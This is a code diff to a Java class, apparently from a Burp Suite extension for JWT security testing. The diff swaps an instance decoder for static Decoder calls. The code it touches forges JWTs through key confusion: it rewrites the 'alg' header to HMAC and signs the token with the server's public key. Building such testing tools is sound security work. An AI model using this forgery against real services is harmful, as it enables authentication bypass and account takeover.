@@ -56,7 +56,6 @@ public class KeyConfusionInfo implements IAttackInfo {
     private static final Logger loggerInstance = Logger.getInstance();
     private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");
 
-    private Decoder joseDecoder = new Decoder();
     private IExtensionHelpers helpers;
     private IHttpRequestResponse requestResponse;
     private IParameter parameter;
@@ -238,10 +237,10 @@ public class KeyConfusionInfo implements IAttackInfo {
                 try {
                     // Change the "alg" header value for each of the algorithms entries
                     byte[] request = this.requestResponse.getRequest();
-                    String[] components = joseDecoder.getComponents(this.parameter.getValue());
-                    String decodedHeader = joseDecoder.getDecoded(components[0]);
+                    String[] components = Decoder.getComponents(this.parameter.getValue());
+                    String decodedHeader = Decoder.getDecoded(components[0]);
                     String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
-                    String encodedHeaderReplacedAlgorithm = joseDecoder.getEncoded(decodedHeaderReplacedAlgorithm);
+                    String encodedHeaderReplacedAlgorithm = Decoder.getEncoded(decodedHeaderReplacedAlgorithm);
 
                     String macAlg;
                     switch(algorithm) {
@@ -256,11 +255,11 @@ public class KeyConfusionInfo implements IAttackInfo {
                     }
 
                     // Generate signature
-                    String newSignature = generateSignature(macAlg, helpers.stringToBytes(publicKey.getValue()), helpers.stringToBytes(joseDecoder.concatComponents(new String[] {encodedHeaderReplacedAlgorithm, components[1]})));
+                    String newSignature = generateSignature(macAlg, helpers.stringToBytes(publicKey.getValue()), helpers.stringToBytes(Decoder.concatComponents(new String[] {encodedHeaderReplacedAlgorithm, components[1]})));
 
                     // Build new JWT String and update parameter
                     String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
-                    String newComponentsConcatenated = joseDecoder.concatComponents(newComponents);
+                    String newComponentsConcatenated = Decoder.concatComponents(newComponents);
 
                     IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
                     request = helpers.updateParameter(request, updatedParameter);
@@ -404,7 +403,7 @@ public class KeyConfusionInfo implements IAttackInfo {
         HashMap<String, String> result = new HashMap<>();
         result.put("header", header);
         result.put("payload", payload);
-        result.put("signature", generateSignature(macAlg, helpers.stringToBytes(modifiedKey), helpers.stringToBytes(joseDecoder.concatComponents(new String[] {joseDecoder.base64UrlEncode(helpers.stringToBytes(header)), joseDecoder.base64UrlEncode(helpers.stringToBytes(payload))}))));
+        result.put("signature", generateSignature(macAlg, helpers.stringToBytes(modifiedKey), helpers.stringToBytes(Decoder.concatComponents(new String[] {Decoder.base64UrlEncode(helpers.stringToBytes(header)), Decoder.base64UrlEncode(helpers.stringToBytes(payload))}))));
 
         if(publicKeyValue.isEmpty()) {
             return result;
@@ -419,7 +418,7 @@ public class KeyConfusionInfo implements IAttackInfo {
             SecretKeySpec secret_key = new SecretKeySpec(key, algorithm);
             mac.init(secret_key);
 
-            return joseDecoder.getEncoded(mac.doFinal(message));
+            return Decoder.getEncoded(mac.doFinal(message));
         } catch (Exception e) {
             loggerInstance.log(getClass(), "Error during signature generation: " + e.getMessage(), Logger.LogLevel.ERROR);
             return "ERROR";
